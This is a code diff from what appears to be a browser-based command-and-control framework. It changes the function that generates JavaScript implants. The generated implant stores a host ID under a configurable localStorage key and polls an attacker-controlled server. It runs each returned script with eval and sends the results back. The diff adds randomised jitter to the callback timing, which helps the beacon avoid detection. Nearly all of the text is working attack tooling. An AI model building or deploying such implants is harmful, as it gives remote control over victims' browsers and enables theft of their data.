@@ -2,7 +2,9 @@ const Implant = require("../models/Implant");
 const Payload = require("../models/Payload");
 const { createEvent } = require("./eventControllers");
 
-async function generateImplant(server, callbackInterval) {
+async function generateImplant(req, res) {
+
+    let { server, initialPayload, callbackInterval, minJitter, maxJitter, hostCookie } = req.body;
 
     // Validate URI for server
     server = server.replace(/\/+$/, "");
@@ -20,8 +22,8 @@ async function generateImplant(server, callbackInterval) {
     let data = {}
     let id = "";
 
-    function setData(name, value) {
-        data[name] = value;
+    function setData(name, value, type) {
+        data[name] = {"value": value, "type": type};
     }
 
     async function createHID() {
@@ -37,7 +39,7 @@ async function generateImplant(server, callbackInterval) {
                 "associatedImplant": "%%IMPLANTID%%"
             })
         }).then(res => res.json()).then(responseData => {
-            localStorage.setItem("HID", responseData.id);
+            localStorage.setItem("${hostCookie}", responseData.id);
             if(responseData.initialPayload && responseData.initialPayload.payload !== "") {
                 try {
                     eval(responseData.initialPayload.payload);
@@ -65,10 +67,10 @@ async function generateImplant(server, callbackInterval) {
     }
     
     async function poll() {
-        if(localStorage.getItem("HID") == null || localStorage.getItem("HID") == undefined) {
+        if(localStorage.getItem("${hostCookie}") == null || localStorage.getItem("${hostCookie}") == undefined) {
             createHID();
         } else {
-            id = localStorage.getItem("HID");
+            id = localStorage.getItem("${hostCookie}");
         }
 
         if (id && id !== "undefined") {
@@ -84,8 +86,8 @@ async function generateImplant(server, callbackInterval) {
                     }),
                 }).then(response => response.json().then(responseData => {
                     commands = [];
-                    data = {}
                     responseData.forEach((payload) => {
+                        data = {}
                         const script = payload.script
                         try {
                             if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
@@ -95,7 +97,6 @@ async function generateImplant(server, callbackInterval) {
                             } else {
                                 eval(script);
                             }
-
                             commands.push({
                                 id: payload.id,
                                 name: payload.name,
@@ -117,18 +118,28 @@ async function generateImplant(server, callbackInterval) {
                     });
                 }));
             } catch (error) {
-                localStorage.removeItem("HID");
+                localStorage.removeItem("${hostCookie}");
             }
         }
     }
-    setInterval(poll, ${callbackInterval});
-    poll();
+
+    (function loop() {
+        var interval = ${callbackInterval} + ((Math.random() * (${maxJitter} - ${minJitter}) + ${minJitter}) * (Math.random() < 0.5 ? -1 : 1));
+        setTimeout(function() {
+                poll();
+                loop();  
+        }, interval);
+    }());
+    poll()
 `
     try {
         const implant = await Implant.create({
             server: server,
             payload: template,
             callbackInterval: callbackInterval,
+            minJitter: minJitter,
+            maxJitter: maxJitter,
+            hostCookie: hostCookie,
             initialPayload: {name: "", payload: ""}
         })
         createEvent("Team Server", `Implant ${implant._id} created`, "info");
